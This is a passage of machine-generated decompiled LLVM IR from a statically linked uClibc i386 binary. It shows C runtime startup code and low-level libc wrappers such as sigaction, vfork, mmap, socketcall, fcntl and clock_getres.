  store i32 %v3_804d7da, i32* @global_var_80569cc.376, align 4
  br label %dec_label_pc_804d7ef

dec_label_pc_804d7ef:                             ; preds = %entry, %dec_label_pc_804d7e9
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_804d7f4 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804d7f9 = bitcast i32* %stack_var_-136 to i8*
  %v4_804d7f9 = call i32 @__GI_memset(i8* %v3_804d7f9, i32 0, i32 120)
  %v0_804d7fe = load i32, i32* @global_var_80569cc.376, align 4
  br label %dec_label_pc_804d806

dec_label_pc_804d806:                             ; preds = %dec_label_pc_804d806, %dec_label_pc_804d7ef
  %v0_804d806 = phi i32 [ %v1_804d809, %dec_label_pc_804d806 ], [ %v0_804d7fe, %dec_label_pc_804d7ef ]
  %v1_804d806 = inttoptr i32 %v0_804d806 to i32*
  %v2_804d806 = load i32, i32* %v1_804d806, align 4
  %v3_804d806 = icmp eq i32 %v2_804d806, 0
  %v1_804d809 = add i32 %v0_804d806, 4
  %v1_804d80c = icmp eq i1 %v3_804d806, false
  br i1 %v1_804d80c, label %dec_label_pc_804d806, label %dec_label_pc_804d82d.preheader

dec_label_pc_804d82d.preheader:                   ; preds = %dec_label_pc_804d806
  store i32 %v1_804d809, i32* @ebx, align 4
  %v1_804d82d1 = inttoptr i32 %v1_804d809 to i32*
  %v2_804d82d2 = load i32, i32* %v1_804d82d1, align 4
  %v3_804d82d3 = icmp eq i32 %v2_804d82d2, 0
  %v1_804d83010 = icmp eq i1 %v3_804d82d3, false
  br i1 %v1_804d83010, label %dec_label_pc_804d812.lr.ph, label %dec_label_pc_804d832

dec_label_pc_804d812.lr.ph:                       ; preds = %dec_label_pc_804d82d.preheader
  %v3_804d7f2 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804d81d = add i32 %v3_804d7f2, 32
  br label %dec_label_pc_804d812

dec_label_pc_804d812:                             ; preds = %dec_label_pc_804d812.lr.ph, %dec_label_pc_804d82a
  %v1_804d81d = phi i32 [ %v2_804d82d2, %dec_label_pc_804d812.lr.ph ], [ %v2_804d82d, %dec_label_pc_804d82a ]
  %v0_804d81c = phi i32 [ %v1_804d809, %dec_label_pc_804d812.lr.ph ], [ %v1_804d82a, %dec_label_pc_804d82a ]
  %v6_804d817 = icmp ugt i32 %v1_804d81d, 14
  br i1 %v6_804d817, label %dec_label_pc_804d82a, label %dec_label_pc_804d819

dec_label_pc_804d819:                             ; preds = %dec_label_pc_804d812
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_804d81c, i32* %stack_var_-168, align 4
  %v2_804d81d = mul i32 %v1_804d81d, 8
  %v4_804d81d = add i32 %v3_804d81d, %v2_804d81d
  %v3_804d822 = inttoptr i32 %v4_804d81d to i16*
  %v4_804d822 = call i32 @memcpy(i16* %v3_804d822, i32 %v0_804d81c, i32 8)
  %v0_804d82a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d82a

dec_label_pc_804d82a:                             ; preds = %dec_label_pc_804d812, %dec_label_pc_804d819
  %v0_804d82a = phi i32 [ %v0_804d81c, %dec_label_pc_804d812 ], [ %v0_804d82a.pre, %dec_label_pc_804d819 ]
  %v1_804d82a = add i32 %v0_804d82a, 8
  store i32 %v1_804d82a, i32* @ebx, align 4
  %v1_804d82d = inttoptr i32 %v1_804d82a to i32*
  %v2_804d82d = load i32, i32* %v1_804d82d, align 4
  %v3_804d82d = icmp eq i32 %v2_804d82d, 0
  %v1_804d830 = icmp eq i1 %v3_804d82d, false
  br i1 %v1_804d830, label %dec_label_pc_804d812, label %dec_label_pc_804d832

dec_label_pc_804d832:                             ; preds = %dec_label_pc_804d82a, %dec_label_pc_804d82d.preheader
  store i32 %v2_804d7f4, i32* @eax, align 4
  %v0_804d836 = call i32 @_dl_aux_init()
  store i32 %v0_804d836, i32* @eax, align 4
  %v0_804d83b = call i32 @__GI___uClibc_init()
  %v1_804d844 = icmp eq i32 %tmp26, 0
  %v1_804d846 = icmp eq i1 %v1_804d844, false
  br i1 %v1_804d846, label %dec_label_pc_804d84c, label %dec_label_pc_804d848

dec_label_pc_804d848:                             ; preds = %dec_label_pc_804d832
  %v1_804d848 = and i32 %tmp26, -65536
  %v2_804d848 = or i32 %v1_804d848, 4096
  br label %dec_label_pc_804d84c

dec_label_pc_804d84c:                             ; preds = %dec_label_pc_804d832, %dec_label_pc_804d848
  %v0_804d84c = phi i32 [ %tmp26, %dec_label_pc_804d832 ], [ %v2_804d848, %dec_label_pc_804d848 ]
  store i32 %v0_804d84c, i32* @global_var_80569d0.307, align 16
  %v13_804d851 = icmp eq i32 %tmp25, -1
  %v1_804d856 = icmp eq i1 %v13_804d851, false
  br i1 %v1_804d856, label %dec_label_pc_804d881, label %dec_label_pc_804d858

dec_label_pc_804d858:                             ; preds = %dec_label_pc_804d84c
  %v0_804d858 = call i32 @getuid()
  store i32 %v0_804d858, i32* @ebx, align 4
  %v0_804d85f = call i32 @geteuid()
  %v0_804d864 = load i32, i32* @ebx, align 4
  %v12_804d864 = icmp eq i32 %v0_804d864, %v0_804d85f
  %v1_804d866 = icmp eq i1 %v12_804d864, false
  br i1 %v1_804d866, label %dec_label_pc_804d897, label %dec_label_pc_804d868

dec_label_pc_804d868:                             ; preds = %dec_label_pc_804d858
  %v0_804d868 = call i32 @getgid()
  store i32 %v0_804d868, i32* @ebx, align 4
  %v0_804d86f = call i32 @getegid()
  %v0_804d874 = load i32, i32* @ebx, align 4
  %v12_804d874 = icmp eq i32 %v0_804d874, %v0_804d86f
  %v1_804d876 = icmp eq i1 %v12_804d874, false
  br i1 %v1_804d876, label %dec_label_pc_804d897, label %dec_label_pc_804d878.thread

dec_label_pc_804d878.thread:                      ; preds = %dec_label_pc_804d868
  br label %dec_label_pc_804d8c1

dec_label_pc_804d881:                             ; preds = %dec_label_pc_804d84c
  %v15_804d881 = icmp eq i32 %tmp25, %tmp24
  %v1_804d885 = icmp eq i1 %v15_804d881, false
  br i1 %v1_804d885, label %dec_label_pc_804d897, label %dec_label_pc_804d887

dec_label_pc_804d887:                             ; preds = %dec_label_pc_804d881
  br label %dec_label_pc_804d897

dec_label_pc_804d897:                             ; preds = %dec_label_pc_804d887, %dec_label_pc_804d881, %dec_label_pc_804d868, %dec_label_pc_804d858
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804d89e = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804d8ad = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804d8bc = call i32 @__check_one_fd()
  br label %dec_label_pc_804d8c1

dec_label_pc_804d8c1:                             ; preds = %dec_label_pc_804d878.thread, %dec_label_pc_804d897
  store i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32* %esi.global-to-local, align 4
  %v0_804d8c6 = load i32, i32* @edi, align 4
  %v1_804d8c6 = inttoptr i32 %v0_804d8c6 to i32*
  %v2_804d8c6 = load i32, i32* %v1_804d8c6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32* %esi.global-to-local, align 4
  store i32 %v2_804d8c6, i32* inttoptr (i32 134562584 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80569d4.380, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560741), i32 6), label %dec_label_pc_804d8e6, label %dec_label_pc_804d8f2

dec_label_pc_804d8e6:                             ; preds = %dec_label_pc_804d8c1, %dec_label_pc_804d8e6
  %v4_804d8e648 = phi i32 [ %v1_804d8ed, %dec_label_pc_804d8e6 ], [ 0, %dec_label_pc_804d8c1 ]
  store i32 ptrtoint (i32* @global_var_804d8ed.386 to i32), i32* %stack_var_-164, align 4
  %v5_804d8e6 = mul i32 %v4_804d8e648, 4
  %v6_804d8e6 = add i32 %v5_804d8e6, ptrtoint (i32* @global_var_8053be8.378 to i32)
  %v7_804d8e6 = inttoptr i32 %v6_804d8e6 to i32*
  %v8_804d8e6 = load i32, i32* %v7_804d8e6, align 4
  call void @__pseudo_call(i32 %v8_804d8e6)
  %v0_804d8ed = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d8ed = add i32 %v0_804d8ed, 1
  store i32 %v1_804d8ed, i32* %ebx.global-to-local, align 4
  %v1_804d8ee.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804d8ee = icmp ult i32 %v1_804d8ed, %v1_804d8ee.pre
  br i1 %v7_804d8ee, label %dec_label_pc_804d8e6, label %dec_label_pc_804d8f2

dec_label_pc_804d8f2:                             ; preds = %dec_label_pc_804d8e6, %dec_label_pc_804d8c1
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 2), i32 0), label %dec_label_pc_804d90a, label %dec_label_pc_804d916

dec_label_pc_804d90a:                             ; preds = %dec_label_pc_804d8f2, %dec_label_pc_804d90a
  %v4_804d90a45 = phi i32 [ %v1_804d911, %dec_label_pc_804d90a ], [ 0, %dec_label_pc_804d8f2 ]
  store i32 ptrtoint (i32* @global_var_804d911.387 to i32), i32* %stack_var_-164, align 4
  %v5_804d90a = mul i32 %v4_804d90a45, 4
  %v6_804d90a = add i32 %v5_804d90a, ptrtoint (i32* @global_var_8053be8.378 to i32)
  %v7_804d90a = inttoptr i32 %v6_804d90a to i32*
  %v8_804d90a = load i32, i32* %v7_804d90a, align 4
  call void @__pseudo_call(i32 %v8_804d90a)
  %v0_804d911 = load i32, i32* @ebx, align 4
  %v1_804d911 = add i32 %v0_804d911, 1
  store i32 %v1_804d911, i32* @ebx, align 4
  %v1_804d912.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804d912 = icmp ult i32 %v1_804d911, %v1_804d912.pre
  br i1 %v7_804d912, label %dec_label_pc_804d90a, label %dec_label_pc_804d916

dec_label_pc_804d916:                             ; preds = %dec_label_pc_804d90a, %dec_label_pc_804d8f2
  %v0_804d91f = load i32, i32* %stack_var_-164, align 4
  %v1_804d91f = call i32 @__errno_location(i32 %v0_804d91f)
  %v1_804d924 = inttoptr i32 %v1_804d91f to i32*
  store i32 0, i32* %v1_804d924, align 4
  %v0_804d933 = call i32 @__GI___h_errno_location()
  store i32 %v0_804d933, i32* @eax, align 4
  %v1_804d938 = inttoptr i32 %v0_804d933 to i32*
  store i32 0, i32* %v1_804d938, align 4
  %v0_804d93e = load i32, i32* @eax, align 4
  store i32 %v0_804d93e, i32* %stack_var_-164, align 4
  %v0_804d93f = load i32, i32* @global_var_80569cc.376, align 4
  store i32 %v0_804d93f, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_804d7a3)
  %v0_804d954 = load i32, i32* @eax, align 4
  %v1_804d957 = call i32 @__GI_exit(i32 %v0_804d954)
  %v0_804d961 = load i32, i32* @ebx, align 4
  %v1_804d961 = inttoptr i32 %v0_804d961 to %sigcontext*
  %v2_804d961 = call i32 @sigreturn(%sigcontext* %v1_804d961)
  %v0_804d969 = load i32, i32* @ebx, align 4
  %v1_804d969 = inttoptr i32 %v0_804d969 to %sigcontext*
  %v2_804d969 = call i32 @sigreturn(%sigcontext* %v1_804d969)
  ret i32 %v2_804d969

; uselistorder directives
  uselistorder i32 %v1_804d911, { 1, 2, 0 }
  uselistorder i32 %v1_804d8ed, { 1, 2, 0 }
  uselistorder i32 %v2_804d82d, { 1, 0 }
  uselistorder i32 %v1_804d82a, { 2, 1, 0 }
  uselistorder i32 %v1_804d809, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d806, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053be8.378 to i32), i32 -134560744), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 10, 11, 2, 9, 5, 6, 0, 1, 3, 7, 4, 8 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804d90a, { 1, 0 }
  uselistorder label %dec_label_pc_804d8e6, { 1, 0 }
  uselistorder label %dec_label_pc_804d8c1, { 1, 0 }
  uselistorder label %dec_label_pc_804d84c, { 1, 0 }
  uselistorder label %dec_label_pc_804d82a, { 1, 0 }
  uselistorder label %dec_label_pc_804d812, { 1, 0 }
  uselistorder label %dec_label_pc_804d7ef, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804d96b = load i32, i32* @esi, align 4
  %v0_804d96c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804d981 = icmp eq i32* %arg2, null
  br i1 %v1_804d981, label %dec_label_pc_804d9d4, label %dec_label_pc_804d985

dec_label_pc_804d985:                             ; preds = %entry
  %v2_804d985 = load i32, i32* %arg2, align 4
  store i32 %v2_804d985, i32* %stack_var_-148, align 4
  %v1_804d98e = add i32 %tmp11, 4
  %v3_804d9a0 = bitcast i32* %stack_var_-136 to i16*
  %v4_804d9a0 = call i32 @memcpy(i16* %v3_804d9a0, i32 %v1_804d98e, i32 128)
  %v1_804d9a5 = add i32 %tmp11, 132
  %v2_804d9bf = inttoptr i32 %v1_804d9a5 to i8*
  %v3_804d9bf = load i8, i8* %v2_804d9bf, align 1
  %v4_804d9bf = and i8 %v3_804d9bf, 4
  %v5_804d9bf = icmp eq i8 %v4_804d9bf, 0
  %v1_804d9c6 = icmp eq i1 %v5_804d9bf, false
  br i1 %v1_804d9c6, label %dec_label_pc_804d9d4, label %dec_label_pc_804d9c8

dec_label_pc_804d9c8:                             ; preds = %dec_label_pc_804d985
  br label %dec_label_pc_804d9d4

dec_label_pc_804d9d4:                             ; preds = %dec_label_pc_804d9c8, %dec_label_pc_804d985, %entry
  %v1_804d9d6 = icmp eq i32 %arg3, 0
  br i1 %v1_804d9d6, label %dec_label_pc_804d9de, label %dec_label_pc_804d9da

dec_label_pc_804d9da:                             ; preds = %dec_label_pc_804d9d4
  %v2_804d9da = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804d9de

dec_label_pc_804d9de:                             ; preds = %dec_label_pc_804d9d4, %dec_label_pc_804d9da
  %v0_804d9ed = phi i32 [ 0, %dec_label_pc_804d9d4 ], [ %v2_804d9da, %dec_label_pc_804d9da ]
  br i1 %v1_804d981, label %dec_label_pc_804d9eb, label %dec_label_pc_804d9e4

dec_label_pc_804d9e4:                             ; preds = %dec_label_pc_804d9de
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804d9eb

dec_label_pc_804d9eb:                             ; preds = %dec_label_pc_804d9de, %dec_label_pc_804d9e4
  %v0_804d9ee = phi %sigaction* [ null, %dec_label_pc_804d9de ], [ %phitmp, %dec_label_pc_804d9e4 ]
  %v5_804d9f6 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804d9ee, i32 %v0_804d9ed, i32 8)
  store i32 %v5_804d9f6, i32* %ebx.global-to-local, align 4
  br i1 %v1_804d9d6, label %dec_label_pc_804da39, label %dec_label_pc_804da04

dec_label_pc_804da04:                             ; preds = %dec_label_pc_804d9eb
  %v2_804da04 = icmp slt i32 %v5_804d9f6, 0
  br i1 %v2_804da04, label %dec_label_pc_804da39, label %dec_label_pc_804da08

dec_label_pc_804da08:                             ; preds = %dec_label_pc_804da04
  %v3_804da08 = load i32, i32* %stack_var_-288, align 4
  %v2_804da0c = inttoptr i32 %arg3 to i32*
  store i32 %v3_804da08, i32* %v2_804da0c, align 4
  %v2_804da14 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804da19 = add i32 %arg3, 4
  %v3_804da1d = inttoptr i32 %v1_804da19 to i16*
  %v4_804da1d = call i32 @memcpy(i16* %v3_804da1d, i32 %v2_804da14, i32 128)
  %v2_804da26 = add i32 %arg3, 132
  %v3_804da26 = inttoptr i32 %v2_804da26 to i32*
  %v2_804da33 = add i32 %arg3, 136
  %v3_804da33 = inttoptr i32 %v2_804da33 to i32*
  %v0_804da39.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804da39

dec_label_pc_804da39:                             ; preds = %dec_label_pc_804da04, %dec_label_pc_804d9eb, %dec_label_pc_804da08
  %v0_804da39 = phi i32 [ %v5_804d9f6, %dec_label_pc_804da04 ], [ %v5_804d9f6, %dec_label_pc_804d9eb ], [ %v0_804da39.pre, %dec_label_pc_804da08 ]
  store i32 %v0_804d96c, i32* @ebx, align 4
  store i32 %v0_804d96b, i32* @esi, align 4
  ret i32 %v0_804da39

; uselistorder directives
  uselistorder i32 %v5_804d9f6, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804d9d6, { 1, 0 }
  uselistorder i1 %v1_804d981, { 1, 0 }
  uselistorder i32* null, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804da39, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d9eb, { 1, 0 }
  uselistorder label %dec_label_pc_804d9de, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804da4a = call i32 @vfork()
  %v5_804da4d = icmp ult i32 %v0_804da4a, -4095
  %v1_804da52 = icmp eq i1 %v5_804da4d, false
  call void @__pseudo_cond_branch(i1 %v1_804da52, i32 134543236)
  ret i32 %v0_804da4a
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804da5c = load i32, i32* @ebx, align 4
  %v2_804da63 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804da63, i32* @ebx, align 4
  %v8_804da67 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804da5c, i32* @ebx, align 4
  %v3_804da70 = icmp ugt i32 %v8_804da67, -4096
  call void @__pseudo_cond_branch(i1 %v3_804da70, i32 134543236)
  ret i32 %v8_804da67

; uselistorder directives
  uselistorder i32 %v8_804da67, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804da78 = load i32, i32* @ebx, align 4
  store i32 %v0_804da78, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804da8b = call i32 @int80_syscall(i32 102)
  store i32 %v1_804da8b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804da8b, -4095
  br i1 %tmp8, label %dec_label_pc_804daa4, label %dec_label_pc_804da98

dec_label_pc_804da98:                             ; preds = %entry
  %v0_804da98 = load i32, i32* %stack_var_-4, align 4
  %v1_804da98 = call i32 @__errno_location(i32 %v0_804da98)
  %v0_804da9d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804da9d = sub i32 0, %v0_804da9d
  %v2_804da9f = inttoptr i32 %v1_804da98 to i32*
  store i32 %v1_804da9d, i32* %v2_804da9f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804daa4

dec_label_pc_804daa4:                             ; preds = %entry, %dec_label_pc_804da98
  %v0_804daa4 = phi i32 [ %v1_804da8b, %entry ], [ -1, %dec_label_pc_804da98 ]
  %v2_804daa6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804daa6, i32* @edx, align 4
  %v2_804daa8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804daa8, i32* @ebx, align 4
  ret i32 %v0_804daa4

; uselistorder directives
  uselistorder i32 %v1_804da8b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804daa4, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804daac = load i32, i32* @edi, align 4
  %v0_804daad = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804dac1 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804dacb = icmp ugt i32 %v1_804dac1, 2
  br i1 %v6_804dacb, label %dec_label_pc_804dadb, label %dec_label_pc_804dacd

dec_label_pc_804dacd:                             ; preds = %entry
  %v4_804dad1 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804dac1)
  br label %dec_label_pc_804dafd

dec_label_pc_804dadb:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804dae3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804dae3, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804dae3, -4095
  br i1 %tmp17, label %dec_label_pc_804dafb, label %dec_label_pc_804daef

dec_label_pc_804daef:                             ; preds = %dec_label_pc_804dadb
  %v1_804daef = call i32 @__errno_location(i32 %v0_804daad)
  %v0_804daf4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804daf4 = sub i32 0, %v0_804daf4
  %v2_804daf6 = inttoptr i32 %v1_804daef to i32*
  store i32 %v1_804daf4, i32* %v2_804daf6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dafb

dec_label_pc_804dafb:                             ; preds = %dec_label_pc_804dadb, %dec_label_pc_804daef
  %v0_804dafb = phi i32 [ %v2_804dae3, %dec_label_pc_804dadb ], [ -1, %dec_label_pc_804daef ]
  br label %dec_label_pc_804dafd

dec_label_pc_804dafd:                             ; preds = %dec_label_pc_804dacd, %dec_label_pc_804dafb
  %v0_804db02 = phi i32 [ %v4_804dad1, %dec_label_pc_804dacd ], [ %v0_804dafb, %dec_label_pc_804dafb ]
  store i32 %v0_804daad, i32* @ebx, align 4
  store i32 %v0_804daac, i32* @edi, align 4
  ret i32 %v0_804db02

; uselistorder directives
  uselistorder i32 %v2_804dae3, { 1, 0, 2 }
  uselistorder i32 %v0_804daad, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dafd, { 1, 0 }
  uselistorder label %dec_label_pc_804dafb, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db04 = load i32, i32* @edi, align 4
  store i32 %v0_804db04, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804db1c = load i32, i32* @ebx, align 4
  %v1_804db24 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804db24, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804db24, -4095
  br i1 %tmp11, label %dec_label_pc_804db3c, label %dec_label_pc_804db30

dec_label_pc_804db30:                             ; preds = %entry
  %v1_804db30 = call i32 @__errno_location(i32 %v0_804db1c)
  %v0_804db35 = load i32, i32* %edi.global-to-local, align 4
  %v1_804db35 = sub i32 0, %v0_804db35
  %v2_804db37 = inttoptr i32 %v1_804db30 to i32*
  store i32 %v1_804db35, i32* %v2_804db37, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804db3c

dec_label_pc_804db3c:                             ; preds = %entry, %dec_label_pc_804db30
  %v0_804db3c = phi i32 [ %v1_804db24, %entry ], [ -1, %dec_label_pc_804db30 ]
  %v2_804db41 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db41, i32* %edi.global-to-local, align 4
  ret i32 %v0_804db3c

; uselistorder directives
  uselistorder i32 %v1_804db24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db3c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804db45 = load i32, i32* @esi, align 4
  store i32 %v0_804db45, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804db59 = load i32, i32* @ebx, align 4
  %v7_804db61 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804db61, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804db61, -4095
  br i1 %tmp13, label %dec_label_pc_804db79, label %dec_label_pc_804db6d

dec_label_pc_804db6d:                             ; preds = %entry
  %v1_804db6d = call i32 @__errno_location(i32 %v0_804db59)
  %v0_804db72 = load i32, i32* %esi.global-to-local, align 4
  %v1_804db72 = sub i32 0, %v0_804db72
  %v2_804db74 = inttoptr i32 %v1_804db6d to i32*
  store i32 %v1_804db72, i32* %v2_804db74, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804db79

dec_label_pc_804db79:                             ; preds = %entry, %dec_label_pc_804db6d
  %v0_804db79 = phi i32 [ %v7_804db61, %entry ], [ -1, %dec_label_pc_804db6d ]
  %v2_804db7b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db7b, i32* @edx, align 4
  %v2_804db7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804db7c, i32* @esi, align 4
  ret i32 %v0_804db79

; uselistorder directives
  uselistorder i32 %v7_804db61, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db79, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dba8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804dbbb = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804dbbb, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_804dbbb, -4095
  br i1 %tmp9, label %dec_label_pc_804dbd4, label %dec_label_pc_804dbc8

dec_label_pc_804dbc8:                             ; preds = %entry
  %v0_804dbc8 = load i32, i32* %stack_var_-4, align 4
  %v1_804dbc8 = call i32 @__errno_location(i32 %v0_804dbc8)
  %v0_804dbcd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dbcd = sub i32 0, %v0_804dbcd
  %v2_804dbcf = inttoptr i32 %v1_804dbc8 to i32*
  store i32 %v1_804dbcd, i32* %v2_804dbcf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dbd4

dec_label_pc_804dbd4:                             ; preds = %entry, %dec_label_pc_804dbc8
  %v0_804dbd4 = phi i32 [ %v4_804dbbb, %entry ], [ -1, %dec_label_pc_804dbc8 ]
  %v2_804dbd6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dbd6, i32* @edx, align 4
  %v2_804dbd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dbd8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dbd4

; uselistorder directives
  uselistorder i32 %v4_804dbbb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
